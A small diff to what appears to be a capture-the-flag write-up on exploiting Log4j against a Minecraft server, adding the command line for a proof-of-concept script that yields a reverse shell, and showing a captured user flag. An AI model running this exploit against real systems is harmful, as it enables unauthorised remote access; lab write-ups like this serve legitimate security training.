@@ -117,6 +117,8 @@ to run the exploit properly, we need to move the pyCraft folder to the log4j fol
 
 its very important to launch the start.py in (env)
 
+we need to run poc.py  --userip <my ip> --webport 4243 --lport <my port>
+
 we get the reverse shell and the user flag in c:\Users\svc_minecraft\Desktop>:
     0730dbf750cc6241369f42e480e3f989
 
